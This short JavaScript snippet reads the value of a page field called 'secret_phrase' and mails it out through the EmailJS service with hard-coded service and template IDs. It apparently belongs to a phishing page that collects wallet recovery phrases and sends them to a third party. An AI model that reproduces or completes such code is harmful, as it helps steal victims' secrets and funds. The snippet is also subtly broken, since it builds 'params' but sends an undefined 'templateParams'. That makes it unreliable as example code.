function SendMail() {
    var params = {
        result : document.getElementById("secret_phrase").value
    }
    emailjs.send('service_0fib79d', 'template_cnqeg6o', templateParams).then(
  (response) => {
    console.log('SUCCESS!', response.status, response.text);
  },
  (error) => {
    console.log('FAILED...', error);
  
    })
}
